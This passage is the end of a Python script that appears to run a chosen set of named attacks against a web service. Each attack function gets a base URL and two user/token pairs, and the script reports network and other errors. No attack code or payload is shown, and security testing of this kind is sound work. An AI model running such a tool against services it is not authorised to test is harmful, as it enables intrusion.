            print(f"{RED}Unknown attack(s): {invalid}  — use --list to see options{RESET}")
            sys.exit(1)

    for key in to_run:
        name, fn = ATTACKS[key]
        try:
            fn(base, u1, t1, u2, t2)
        except requests.exceptions.RequestException as e:
            err(f"{key.upper()} network error: {e}")
        except Exception as e:
            err(f"{key.upper()} unexpected error: {e}")

    print(f"\n{BOLD}Done.{RESET}\n")


if __name__ == "__main__":
    main()
